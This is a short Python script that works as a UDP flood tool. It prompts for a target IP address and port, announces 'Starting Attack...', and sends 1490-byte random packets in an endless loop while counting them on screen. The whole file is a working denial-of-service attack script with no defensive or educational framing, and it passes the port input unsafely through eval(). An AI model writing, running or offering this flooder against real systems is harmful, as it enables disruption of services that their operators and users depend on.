import scapy.all as scapy
import random, colorama
import socket, time, os


current = time.strftime('%H:%M:%S')

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

w = colorama.Fore.WHITE
b = colorama.Fore.BLUE
y = colorama.Fore.YELLOW
g = colorama.Fore.GREEN


os.system('mode 72, 35 & title Hello World!')
ip = input(f'{b}[{w}{current}{b}] {w}Addr: ')
pr = eval(input(f'{b}[{w}{current}{b}] {w}Port: '))

print(f'{y}[{w}{current}{y}] {w}Starting Attack...')
time.sleep(5)


sen = 0
while True:
    r = sock.sendto(bytes, (ip, pr))
    sen = sen + 1
    print(time.strftime(f'{g}[{w}%H:%M:%S{g}] {w}Sent Package {b}[{w}{sen}{b}] {y}[{w}{ip}, {pr} | {r}{y}]{w}'))
